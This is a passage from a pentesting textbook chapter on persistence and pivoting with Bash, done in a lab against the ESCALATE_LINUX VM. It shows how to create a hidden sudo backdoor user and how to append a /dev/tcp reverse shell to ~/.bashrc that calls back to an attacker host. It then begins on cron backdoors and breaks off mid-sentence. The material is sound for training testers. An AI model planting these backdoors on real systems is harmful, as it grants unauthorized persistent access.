<html><head></head><body>
  <div id="_idContainer188">
   <h1 class="chapter-number" id="_idParaDest-187">
    <a id="_idTextAnchor355">
    </a>
    <span class="koboSpan" id="kobo.1.1">
     12
    </span>
   </h1>
   <h1 id="_idParaDest-188">
    <a id="_idTextAnchor356">
    </a>
    <span class="koboSpan" id="kobo.2.1">
     Persistence and Pivoting
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.3.1">
     This chapter focuses on the techniques
    </span>
    <a id="_idIndexMarker735">
    </a>
    <span class="koboSpan" id="kobo.4.1">
     of
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.5.1">
      persistence
     </span>
    </strong>
    <span class="koboSpan" id="kobo.6.1">
     and
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.7.1">
      pivoting
     </span>
    </strong>
    <span class="koboSpan" id="kobo.8.1">
     in
    </span>
    <a id="_idIndexMarker736">
    </a>
    <span class="koboSpan" id="kobo.9.1">
     pentesting, specifically using the Bash shell.
    </span>
    <span class="koboSpan" id="kobo.9.2">
     We’ll cover methods for maintaining long-term access to compromised systems and expanding access within a network.
    </span>
    <span class="koboSpan" id="kobo.9.3">
     Then, we’ll cover both basic and advanced persistence techniques, network pivoting strategies, and methods
    </span>
    <a id="_idIndexMarker737">
    </a>
    <span class="koboSpan" id="kobo.10.1">
     for
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.11.1">
      lateral movement
     </span>
    </strong>
    <span class="koboSpan" id="kobo.12.1">
     .
    </span>
    <span class="koboSpan" id="kobo.12.2">
     We’ll also address the importance of proper cleanup procedures to minimize detectable traces of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.13.1">
      pentesting activities.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.14.1">
     The sections in this chapter progress from fundamental persistence concepts to more sophisticated approaches, followed by an exploration of network pivoting tactics.
    </span>
    <span class="koboSpan" id="kobo.14.2">
     In doing so, you’ll learn about using cron jobs, startup scripts, and system-level services for persistence.
    </span>
    <span class="koboSpan" id="kobo.14.3">
     We’ll cover various pivoting techniques, including port forwarding and tunneling with SSH.
    </span>
    <span class="koboSpan" id="kobo.14.4">
     We’ll conclude by providing guidance on log cleaning, erasing command histories, and managing digital footprints to maintain operational security
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.15.1">
      during pentests.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.16.1">
     In this chapter, we’re going to cover the following
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.17.1">
      main topic
     </span>
     <a id="_idTextAnchor357">
     </a>
     <a id="_idTextAnchor358">
     </a>
     <span class="koboSpan" id="kobo.18.1">
      s:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="koboSpan" id="kobo.19.1">
      The fundamentals of persistence
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.20.1">
       with Ba
      </span>
      <a id="_idTextAnchor359">
      </a>
      <a id="_idTextAnchor360">
      </a>
      <span class="koboSpan" id="kobo.21.1">
       sh
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.22.1">
      Learning advanced
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.23.1">
       persistence techniqu
      </span>
      <a id="_idTextAnchor361">
      </a>
      <a id="_idTextAnchor362">
      </a>
      <span class="koboSpan" id="kobo.24.1">
       es
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.25.1">
      The basics of network pivoting
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.26.1">
       with Ba
      </span>
      <a id="_idTextAnchor363">
      </a>
      <a id="_idTextAnchor364">
      </a>
      <span class="koboSpan" id="kobo.27.1">
       sh
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.28.1">
      Mastering advanced pivoting and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.29.1">
       lateral movement
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.30.1">
      Cleanup and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.31.1">
       covering tracks
      </span>
     </span>
    </li>
   </ul>
   <h1 id="_idParaDest-189">
    <a id="_idTextAnchor365">
    </a>
    <span class="koboSpan" id="kobo.32.1">
     Technical requirements
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.33.1">
     The code for this chapter can be found
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.34.1">
      at
     </span>
    </span>
    <a href="https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.35.1">
       https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter12
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.36.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.37.1">
     If you want to follow along with the exercises, you need to have a Kali and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.38.1">
      ESCALATE_LINUX
     </span>
    </strong>
    <span class="koboSpan" id="kobo.39.1">
     virtual
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.40.1">
      machine available.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.41.1">
     Enter the following command to install the prerequisites on your Kali
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.42.1">
      Linux system:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.43.1">
$ sudo apt install proxychains4</span></pre>
   <p>
    <span class="koboSpan" id="kobo.44.1">
     See
    </span>
    <a href="B22229_11.xhtml#_idTextAnchor317">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.45.1">
        Chapter 11
       </span>
      </em>
     </span>
    </a>
    <span class="koboSpan" id="kobo.46.1">
     for the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.47.1">
      ESCALATE_LINUX
     </span>
    </strong>
    <span class="koboSpan" id="kobo.48.1">
     download link and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.49.1">
      configuration instructions.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.50.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.51.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.52.1">
      ESCALATE_LINUX
     </span>
    </strong>
    <span class="koboSpan" id="kobo.53.1">
     virtual machine will be referred to as
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.54.1">
      target
     </span>
    </em>
    <span class="koboSpan" id="kobo.55.1">
     through the rest of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.56.1">
      this chapter.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.57.1">
     Some initial setup of the target is required before we can start the next section.
    </span>
    <span class="koboSpan" id="kobo.57.2">
     In
    </span>
    <a href="B22229_11.xhtml#_idTextAnchor317">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.58.1">
        Chapter 11
       </span>
      </em>
     </span>
    </a>
    <span class="koboSpan" id="kobo.59.1">
     , we escalated privileges to root and cracked the root password.
    </span>
    <span class="koboSpan" id="kobo.59.2">
     The root password
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.60.1">
      was
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.61.1">
       12345
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.62.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.63.1">
     Here,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.64.1">
      user1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.65.1">
     on the target has sudo rights, as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.66.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer174">
     <span class="koboSpan" id="kobo.67.1">
      <img alt="Figure 12.1 – An entry from /etc/sudoers is shown" src="image/B22229_12_01.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.68.1">
     Figure 12.1 – An entry from /etc/sudoers is shown
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.69.1">
     We’ll set the password for
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.70.1">
      user1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.71.1">
     and use this account for all of the exercises in this chapter.
    </span>
    <span class="koboSpan" id="kobo.71.2">
     This will simulate us having exploited a user account with
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.72.1">
      sudo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.73.1">
     rights and set the stage for following along with
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.74.1">
      the instructions.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.75.1">
     Exploit the web application on the target again to get a shell as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.76.1">
      user6
     </span>
    </strong>
    <span class="koboSpan" id="kobo.77.1">
     .
    </span>
    <span class="koboSpan" id="kobo.77.2">
     Please refer to
    </span>
    <a href="B22229_11.xhtml#_idTextAnchor317">
     <span class="No-Break">
      <em class="italic">
       <span class="koboSpan" id="kobo.78.1">
        Chapter 11
       </span>
      </em>
     </span>
    </a>
    <span class="koboSpan" id="kobo.79.1">
     for guidance if you need a refresher on how to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.80.1">
      do so.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.81.1">
     Before you move on, you’ll need to establish an interactive shell.
    </span>
    <span class="koboSpan" id="kobo.81.2">
     Enter the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.82.1">
      su root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.83.1">
     command and observe that the output says
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.84.1">
      su: must be run from a terminal
     </span>
    </strong>
    <span class="koboSpan" id="kobo.85.1">
     .
    </span>
    <span class="koboSpan" id="kobo.85.2">
     To fix this, enter the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.86.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console">
<a id="_idTextAnchor366"/><a id="_idTextAnchor367"/><a id="_idTextAnchor368"/><a id="_idTextAnchor369"/><a id="_idTextAnchor370"/><span class="koboSpan" id="kobo.87.1">$ python</span><a id="_idTextAnchor371"/><a id="_idTextAnchor372"/><span class="koboSpan" id="kobo.88.1">3 -c 'import pty; pty.spawn("/bin/bash")'</span></pre>
   <p>
    <span class="koboSpan" id="kobo.89.1">
     Then, enter the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.90.1">
      su root
     </span>
    </strong>
    <span class="koboSpan" id="kobo.91.1">
     command and enter
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.92.1">
      12345
     </span>
    </strong>
    <span class="koboSpan" id="kobo.93.1">
     as the password when prompted.
    </span>
    <span class="koboSpan" id="kobo.93.2">
     Finally, enter th
    </span>
    <a id="_idTextAnchor373">
    </a>
    <a id="_idTextAnchor374">
    </a>
    <span class="koboSpan" id="kobo.94.1">
     e
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.95.1">
      echo "user1:12345" |
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.96.1">
       chpasswd
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.97.1">
      command:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer175">
     <span class="koboSpan" id="kobo.98.1">
      <img alt="Figure 12.2 – Setting the password for user1" src="image/B22229_12_02.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.99.1">
     Figure 12.2 – Setting the password for user1
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.100.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.101.1">
     You’ve probably noticed by now that the shell is echoing your commands back to you.
    </span>
    <span class="koboSpan" id="kobo.101.2">
     To stop this, enter the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.102.1">
      stty -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.103.1">
       echo
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.104.1">
      command.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.105.1">
     Finally, we must enter
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.106.1">
      exit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.107.1">
     to exit out of the root prompt and enter
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.108.1">
      su user1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.109.1">
     and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.110.1">
      12345
     </span>
    </strong>
    <span class="koboSpan" id="kobo.111.1">
     when prompted for the password.
    </span>
    <span class="koboSpan" id="kobo.111.2">
     You should now see a prompt for
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.112.1">
      user1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.113.1">
     , as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.114.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer176">
     <span class="koboSpan" id="kobo.115.1">
      <img alt="Figure 12.3 – Switching users to the user1 account" src="image/B22229_12_03.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.116.1">
     Figure 12.3 – Switching users to the user1 account
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.117.1">
     With these initial setup steps out of the way, you’re ready to dive in and take on the exercises
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.118.1">
      that follow.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-190">
    <a id="_idTextAnchor375">
    </a>
    <span class="koboSpan" id="kobo.119.1">
     The fundamentals of persistence with Bash
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.120.1">
     Persistence
    </span>
    <a id="_idIndexMarker738">
    </a>
    <span class="koboSpan" id="kobo.121.1">
     refers to maintaining access to a compromised system after the initial exploitation.
    </span>
    <span class="koboSpan" id="kobo.121.2">
     For pentesters assessing Linux systems, understanding Bash-based persistence techniques is essential.
    </span>
    <span class="koboSpan" id="kobo.121.3">
     This section covers some fundamental methods for establishing persistence
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.122.1">
      using Bash.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-191">
    <a id="_idTextAnchor376">
    </a>
    <span class="koboSpan" id="kobo.123.1">
     Creating a new user in Bash
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.124.1">
     One basic
    </span>
    <a id="_idIndexMarker739">
    </a>
    <span class="koboSpan" id="kobo.125.1">
     technique is
    </span>
    <a id="_idIndexMarker740">
    </a>
    <span class="koboSpan" id="kobo.126.1">
     to create a new user account with root privileges.
    </span>
    <span class="koboSpan" id="kobo.126.2">
     See the following example for the commands to add a new user with
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.127.1">
      root privileges:
     </span>
    </span>
    <a id="_idTextAnchor377">
    </a>
    <a id="_idTextAnchor378">
    </a>
    <a id="_idTextAnchor379">
    </a>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.128.1">
$ su</span><a id="_idTextAnchor380"/><a id="_idTextAnchor381"/><a id="_idTextAnchor382"/><span class="koboSpan" id="kobo.129.1">do useradd -m -s /bin/bash bashdoor</span><a id="_idTextAnchor383"/><a id="_idTextAnchor384"/><a id="_idTextAnchor385"/><span class="koboSpan" id="kobo.130.1">
$ su</span><a id="_idTextAnchor386"/><a id="_idTextAnchor387"/><span class="koboSpan" id="kobo.131.1">do usermod -aG sudo bashdoor</span><a id="_idTextAnchor388"/><a id="_idTextAnchor389"/><a id="_idTextAnchor390"/><span class="koboSpan" id="kobo.132.1">
$ echo "bashdoor:password123" | sudo chpasswd</span></pre>
   <p>
    <span class="koboSpan" id="kobo.133.1">
     These
    </span>
    <a id="_idIndexMarker741">
    </a>
    <span class="koboSpan" id="kobo.134.1">
     commands create a new user named
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.135.1">
      bashdoor
     </span>
    </strong>
    <span class="koboSpan" id="kobo.136.1">
     , add them
    </span>
    <a id="_idIndexMarker742">
    </a>
    <span class="koboSpan" id="kobo.137.1">
     to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.138.1">
      sudo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.139.1">
     group, and set their password to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.140.1">
      password123
     </span>
    </strong>
    <span class="koboSpan" id="kobo.141.1">
     .
    </span>
    <span class="koboSpan" id="kobo.141.2">
     The new user will have full
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.142.1">
      root access.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.143.1">
     Let’s take a closer look at how
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.144.1">
      this works:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.145.1">
       useradd
      </span>
     </strong>
     <span class="koboSpan" id="kobo.146.1">
      : Creates the new
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.147.1">
       user account
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.148.1">
       -m
      </span>
     </strong>
     <span class="koboSpan" id="kobo.149.1">
      : Creates a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.150.1">
       home directory
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.151.1">
       -s
      </span>
     </strong>
     <span class="koboSpan" id="kobo.152.1">
      : Sets the login shell
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.153.1">
       to
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.154.1">
        bash
       </span>
      </strong>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.155.1">
       usermod -aG
      </span>
     </strong>
     <span class="koboSpan" id="kobo.156.1">
      : Adds the user to the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.157.1">
        sudo
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.158.1">
       group
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.159.1">
       chpasswd
      </span>
     </strong>
     <span class="koboSpan" id="kobo.160.1">
      : Sets
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.161.1">
       the password
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.162.1">
     Let’s see this
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.163.1">
      in action:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer177">
     <span class="koboSpan" id="kobo.164.1">
      <img alt="Figure 12.4 – The process for adding a new user with full sudo privileges" src="image/B22229_12_04.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.165.1">
     Figure 12.4 – The process for adding a new user with full sudo privileges
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.166.1">
     Adding a new
    </span>
    <a id="_idIndexMarker743">
    </a>
    <span class="koboSpan" id="kobo.167.1">
     user is noisy and is likely to be noticed.
    </span>
    <span class="koboSpan" id="kobo.167.2">
     It may be less likely to
    </span>
    <a id="_idIndexMarker744">
    </a>
    <span class="koboSpan" id="kobo.168.1">
     be noticed if you simply add a backdoor shell to an existing user.
    </span>
    <span class="koboSpan" id="kobo.168.2">
     We’ll explore this
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.169.1">
      technique next.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-192">
    <a id="_idTextAnchor391">
    </a>
    <span class="koboSpan" id="kobo.170.1">
     Backdooring the Bash shell
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.171.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.172.1">
      ~/.bashrc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.173.1">
     file is
    </span>
    <a id="_idIndexMarker745">
    </a>
    <span class="koboSpan" id="kobo.174.1">
     executed whenever a new interactive Bash shell is opened.
    </span>
    <span class="koboSpan" id="kobo.174.2">
     We can add
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.175.1">
      commands here.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.176.1">
     Before continuing, exit the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.177.1">
      bashdoor
     </span>
    </strong>
    <span class="koboSpan" id="kobo.178.1">
     Terminal session so that you’re back at the prompt for
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.179.1">
      user1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.180.1">
     .
    </span>
    <span class="koboSpan" id="kobo.180.2">
     Enter the following command in your Kali Terminal to ensure you’re ready to catch the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.181.1">
      reverse shell:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.182.1">
$ nc -nlvp 5555</span></pre>
   <p>
    <span class="koboSpan" id="kobo.183.1">
     In your
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.184.1">
      user1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.185.1">
     shell, enter the following command, replacing the IP address and port with
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.186.1">
      you
     </span>
     <a id="_idTextAnchor392">
     </a>
     <a id="_idTextAnchor393">
     </a>
     <span class="koboSpan" id="kobo.187.1">
      r
     </span>
     <a id="_idTextAnchor394">
     </a>
     <a id="_idTextAnchor395">
     </a>
     <span class="koboSpan" id="kobo.188.1">
      own:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.189.1">
$ echo "(/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.101/5555 0&gt;&amp;1) &amp;" &gt;&gt; ~/.bashrc</span></pre>
   <p>
    <span class="koboSpan" id="kobo.190.1">
     This adds a reverse shell command to the user’s
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.191.1">
      ~/.bashrc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.192.1">
     file.
    </span>
    <span class="koboSpan" id="kobo.192.2">
     It will connect back to the attacker’s machine each time a new Terminal
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.193.1">
      is opened.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.194.1">
     Then, establish a new session as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.195.1">
      user1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.196.1">
     with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.197.1">
      su
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.198.1">
       user1
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.199.1">
      command.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.200.1">
     You should see a new session as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.201.1">
      user1
     </span>
    </strong>
    <span class="koboSpan" id="kobo.202.1">
     in the Terminal where you ran
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.203.1">
      nc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.204.1">
     , as shown in the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.205.1">
      following figure:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer178">
     <span class="koboSpan" id="kobo.206.1">
      <img alt="Figure 12.5 – Our reverse shell has been established" src="image/B22229_12_05.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.207.1">
     Figure 12.5 – Our reverse shell has been established
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.208.1">
     Tip
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.209.1">
     If you make a mistake when using
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.210.1">
      echo
     </span>
    </strong>
    <span class="koboSpan" id="kobo.211.1">
     to append to the end of the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.212.1">
      .bashrc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.213.1">
     file, it may be difficult to remove using an editor due to shell limitations.
    </span>
    <span class="koboSpan" id="kobo.213.2">
     You can enter the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.214.1">
      sed -i '$d' filename
     </span>
    </strong>
    <span class="koboSpan" id="kobo.215.1">
     command to delete the last line of
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.216.1">
      a file.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.217.1">
     In addition to
    </span>
    <a id="_idIndexMarker746">
    </a>
    <span class="koboSpan" id="kobo.218.1">
     Bash reverse shell backdoors in
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.219.1">
      .bashrc
     </span>
    </strong>
    <span class="koboSpan" id="kobo.220.1">
     , scheduled jobs are another effective way to maintain persistence on a Linux system
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.221.1">
      in Bash.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-193">
    <a id="_idTextAnchor396">
    </a>
    <span class="koboSpan" id="kobo.222.1">
     Creating backdoor cron jobs
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.223.1">
     Linux
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.224.1">
      cron jobs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.225.1">
     are
    </span>
    <a id="_idIndexMarker747">
    </a>
    <span class="koboSpan" id="kobo.226.1">
     scheduled tasks that run automatically at specified intervals.
    </span>
    <span class="koboSpan" id="kobo.226.2">
     The
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.227.1">
      cron daemon
     </span>
    </strong>
    <span class="koboSpan" id="kobo.228.1">
     is
    </span>
    <a id="_idIndexMarker748">
    </a>
    <span class="koboSpan" id="kobo.229.1">
     a background service that executes these scheduled commands, scripts,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.230.1">
      or programs.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.231.1">
     Cron jobs are defined in
    </span>
    <a id="_idIndexMarker749">
    </a>
    <span class="koboSpan" id="kobo.232.1">
     crontab files, which contain the schedule and command to run.
    </span>
    <span class="koboSpan" id="kobo.232.2">
     Each line in a crontab file represents a single job and follows
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.233.1">
      this format:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.234.1">
* * * * * command_to_execute</span></pre>
   <p>
    <span class="koboSpan" id="kobo.235.1">
     The five asterisks represent the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.236.1">
      following aspects:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.237.1">
       Minute (0-59)
      </span>
     </span>
    </li>
    <li>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.238.1">
       Hour (0-23)
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.239.1">
      Day of
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.240.1">
       month (1-31)
      </span>
     </span>
    </li>
    <li>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.241.1">
       Month (1-12)
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.242.1">
      Day of week (0-7, where 0 and 7
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.243.1">
       are Sunday)
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.244.1">
     Users can edit their crontab file using the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.245.1">
      crontab -e
     </span>
    </strong>
    <span class="koboSpan" id="kobo.246.1">
     command.
    </span>
    <span class="koboSpan" id="kobo.246.2">
     Here’s an example of a cron job that runs a script every day at
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.247.1">
      3:30 A.M.:
     </span>
    </span>
   </p>
   <pre class="source-code"><span class="koboSpan" id="kobo.248.1">
30 3 * * * /path/to/script.sh</span></pre>
   <p>
    <span class="koboSpan" id="kobo.249.1">
     To view existing cron jobs, use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.250.1">
      crontab -
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
